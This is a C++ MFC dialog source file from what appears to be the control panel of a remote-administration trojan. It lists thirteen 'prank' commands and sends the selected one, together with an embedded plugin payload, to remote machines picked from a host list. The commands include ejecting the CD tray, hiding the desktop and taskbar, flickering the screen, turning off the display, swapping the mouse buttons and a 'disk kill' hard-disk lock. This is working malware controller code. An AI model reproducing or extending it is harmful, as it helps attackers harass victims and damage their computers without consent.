// PrankDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "PrankDlg.h"
#include "ClientView.h"
#include "PcView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CPrankDlg dialog


CPrankDlg::CPrankDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPrankDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CPrankDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CPrankDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPrankDlg)
	DDX_Control(pDX, IDC_COMBO_PRANK_TYPE, m_combo_prank_type);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CPrankDlg, CDialog)
	//{{AFX_MSG_MAP(CPrankDlg)
	ON_BN_CLICKED(IDC_BUTTON_SEND, OnButtonSend)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPrankDlg message handlers

BOOL CPrankDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetWindowText("恶作剧");
	m_combo_prank_type.AddString("弹出光驱");
	m_combo_prank_type.AddString("收回光驱");
	m_combo_prank_type.AddString("桌面隐藏");
	m_combo_prank_type.AddString("显示隐藏");
	m_combo_prank_type.AddString("噪音");
	m_combo_prank_type.AddString("闪屏");
	m_combo_prank_type.AddString("关闭显示器");
	m_combo_prank_type.AddString("打开显示器");
	m_combo_prank_type.AddString("隐藏任务栏");
	m_combo_prank_type.AddString("显示任务栏");
	m_combo_prank_type.AddString("鼠标左右互换");
	m_combo_prank_type.AddString("鼠标互换关闭");
	m_combo_prank_type.AddString("硬盘锁");
	m_combo_prank_type.SetCurSel(0);
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
enum
{
	COMMAND_CD_OPEN,
		COMMAND_CD_CLOSE,
		COMMAND_DESKTOP_HIDE,
		COMMAND_DESKTOP_SHOW,
		COMMAND_NOISE,
		COMMAND_FLICKER,
		COMMAND_DISPLAY_CLOSE,
		COMMAND_DISPLAY_OPEN,
		COMMAND_TASKBAR_HIDE,
		COMMAND_TASKBAR_SHOW,
		COMMAND_MOUSE_PANK,
		COMMAND_MOUSE_RECOVER,
		COMMAND_DISK_KILL
};

#include "..\DLL\Plugins\C_PRANK.h"
void CPrankDlg::OnButtonSend() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();
	if ( nItems == 0)
	{
		AfxMessageBox( "没有选择主机" );
		return;
	}
	
	int		nPacketLength = (PRANKMyFileSize )*sizeof(char)+2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_PRANK;

	switch(m_combo_prank_type.GetCurSel())
	{
	case 0:
		lpPacket[1] = COMMAND_CD_OPEN;
		break;
	case 1:
		lpPacket[1] = COMMAND_CD_CLOSE;
		break;
	case 2:
		lpPacket[1] = COMMAND_DESKTOP_HIDE;
		break;
	case 3:
		lpPacket[1] = COMMAND_DESKTOP_SHOW;
		break;
	case 4:
		lpPacket[1] = COMMAND_NOISE;
		break;
	case 5:
		lpPacket[1] = COMMAND_FLICKER;
		break;
	case 6:
		lpPacket[1] = COMMAND_DISPLAY_CLOSE;
		break;
	case 7:
		lpPacket[1] = COMMAND_DISPLAY_OPEN;
		break;
	case 8:
		lpPacket[1] = COMMAND_TASKBAR_HIDE;
		break;
	case 9:
		lpPacket[1] = COMMAND_TASKBAR_SHOW;
		break;
	case 10:
		lpPacket[1] = COMMAND_MOUSE_PANK;
		break;
	case 11:
		lpPacket[1] = COMMAND_MOUSE_RECOVER;
		break;
	case 12:
		lpPacket[1] = COMMAND_DISK_KILL;
		break;
	default:
		AfxMessageBox("BUG");
		delete[] lpPacket;
		return;
	}

	memcpy(lpPacket + 2, (void*)PRANKMyFileBuf, nPacketLength - 2);
	
    pView->SendSelectCommand(lpPacket,nPacketLength);
	delete[] lpPacket;
}
